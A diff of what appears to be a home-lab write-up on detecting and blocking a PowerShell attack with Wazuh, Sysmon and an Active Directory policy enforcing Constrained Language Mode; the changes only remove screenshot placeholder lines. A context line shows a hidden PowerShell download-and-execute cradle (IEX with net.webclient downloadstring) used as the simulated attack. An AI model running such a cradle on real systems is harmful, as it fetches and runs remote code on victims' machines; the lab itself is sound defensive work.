@@ -63,7 +63,6 @@ curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash wazuh-ins
 3. Created the Active Directory forest and configured DNS forwarding.
 4. Joined the Windows 11 Workstation (PC02) to the domain after pointing its primary DNS settings to DC01.
 
-*Placeholder for Active Directory Trust Screenshot:*
 ![Active Directory Computers](images/ad_computers.png)
 *(Image description: Active Directory Users and Computers Console showing PC02 successfully joined under the Computers Container).*
 
@@ -91,7 +90,6 @@ To ensure Wazuh collects Sysmon telemetry, the agent configuration file C:\Progr
 ```
 *Service restarted via:* `Restart-Service -Name "WazuhSvc"`
 
-*Placeholder for Wazuh Agents Connection Screenshot:*
 ![Wazuh Connected Agents](images/wazuh_agents.png)
 *(Image description: Wazuh Web Dashboard showing 2 active agents registered and connected to the manager).*
 
@@ -108,7 +106,6 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 ### Analysis of the Triggered Alert
 Wazuh immediately generated a Level 15 (Critical Severity) Alert based on the Sysmon logs forwarded by the agent. 
 
-*Placeholder for Wazuh Alert Detection Screenshot:*
 ![Wazuh Alert Details](images/wazuh_alert.png)
 *(Image description: Wazuh Threat Hunting Event Details showing Event ID 11 [File Created] for the temporary script policy test written by powershell.exe in the Temp directory).*
 
@@ -129,7 +126,6 @@ On DC01, a new Group Policy Object (GPO) named `Harden-PowerShell` was created a
 * **System Variable Name:** `__PSLockdownPolicy`
 * **Value:** `4` (Constrained Language Mode)
 
-*Placeholder for GPO Configuration Screenshot:*
 ![GPO Configuration](images/gp.png)
 *(Image description: Group Policy Management Editor showing the creation of the __PSLockdownPolicy environment variable).*
 
@@ -144,7 +140,6 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 Output: **`ConstrainedLanguage`**
 
-*Placeholder for Policy Verification Screenshot:*
 ![Policy Verification](images/checking_constraint.png)
 *(Image description: PowerShell terminal confirming the language mode is restricted to ConstrainedLanguage).*
 
@@ -153,7 +148,6 @@ Output: **`ConstrainedLanguage`**
 ### Step 3: Verifying Mitigation (Blocked Attack)
 The PowerShell downloader attack was executed again on PC02. PowerShell immediately terminated the execution, blocking the creation of the .NET webclient object:
 
-*Placeholder for Blocked Attack Screenshot:*
 ![Blocked Attack](images/remediation_block.png)
 *(Image description: PowerShell terminal output displaying a PermissionDenied exception and preventing the download script from running).*
 
